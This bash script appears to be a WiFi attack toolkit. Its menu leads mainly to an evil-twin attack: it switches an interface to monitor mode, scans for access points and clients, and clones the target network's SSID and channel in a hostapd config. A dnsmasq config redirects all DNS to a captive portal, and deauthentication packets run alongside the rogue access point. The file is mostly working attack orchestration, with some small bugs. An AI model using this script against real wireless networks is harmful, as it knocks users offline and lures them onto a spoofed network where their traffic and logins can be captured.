#!/bin/bash



#Check if user is root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit
fi

clear

echo "Welcome"
echo "Choose an option"
echo "1. Attack"
echo "2. Defense"
echo "3. Cleaning"
read -p "Enter your choice: " choice
#if the choice is not 1, 2 or 3, exit
if [ $choice -ne 1 ] && [ $choice -ne 2 ] && [ $choice -ne 3 ]; then
    echo "Invalid choice"
    exit
fi



# If the choice is 3 , run cleansing.sh
if [ $choice -eq 3 ]; then
    echo "Cleaning"
    ./cleansing.sh
    exit
fi


# If the choice is 2, run defense.py
if [ $choice -eq 2 ]; then
    echo "Defense"
    echo "Enter the interface name"
    iwconfig
    read defenseInterface
    python3 defense.py defenseInterface
    exit
fi

clear

iwconfig
echo "Enter the interface name"
read interface

clear

# Check if interface is up
ifconfig $interface | grep UP
if [ $? -eq 0 ]
then
    echo "Interface is up"
else
    echo "Interface is down"

    #Finish
    exit
fi

clear


# Check if interface is in monitor mode
iwconfig $interface | grep Monitor
if [ $? -eq 0 ]
then
    echo "Interface is in monitor mode"
else
    echo "Interface is not in monitor mode"
    
    # Start monitor mode
    ifconfig $interface down
    sleep 1s
    iwconfig $interface mode monitor
    sleep 1s
    ifconfig $interface up
    sleep 1s
    if [ $? -eq 0 ]
    then
        echo "Monitor mode started"
    else
        echo "Monitor mode failed to start"
        exit
    fi
fi


# run script to scan ap's around 
python3 wifi_scanner.py $interface

# get the bssid 
assid=$(cat assid.txt)
rm assid.txt

# get the ssid
ssid=$(cat ssid.txt)
rm ssid.txt

# get the channel
channel=$(cat channel.txt)
rm channel.txt


# run script to scan ap users macs 
python3 ap_scanner.py $interface $assid

echo "Sending deAuth packets to the dest mac ap"
ifconfig
echo "Enter an interface to perform the attack, note that it should be different from the interface you've choose before."
read attackerInterface





# creates an pap/hostapd.conf file for hostapd to use 

  echo "interface=$interface" > pap/hostapd.conf
  echo "driver=nl80211" >> pap/hostapd.conf
  echo "ssid=$ssid" >> pap/hostapd.conf
  echo "hw_mode=g" >> pap/hostapd.conf
  echo "channel=$channel" >> pap/hostapd.conf
  echo "ignore_broadcast_ssid=0" >> pap/hostapd.conf

# creates an pap/dnsmasq.conf file for dnsmasq to use
echo "interface=$interface" > pap/dnsmasq.conf
echo "dhcp-range=192.168.1.10,192.168.1.250,12h" >> pap/dnsmasq.conf
echo "dhcp-option=1,255.255.255.0" >> pap/dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> pap/dnsmasq.conf
echo "dhcp-option=6,192.168.1.1" >> pap/dnsmasq.conf
echo "server=8.8.8.8" >> pap/dnsmasq.conf
echo "log-queries" >> pap/dnsmasq.conf
echo "log-dhcp" >> pap/dnsmasq.conf
echo "address=/#/192.168.1.1" >> pap/dnsmasq.conf
echo "dnsmasq -C pap/dnsmasq.conf -d" >> pap/dnsmasq.conf


echo "Starting the sattack"
# Run 3 pararallel threads for the attack captive portal and dnsmasq 
sudo python3 deauth_good.py $attackerInterface $assid &
sudo hostapd pap/hostapd.conf  & 
sudo sh dnsmasq.sh $interface &
wait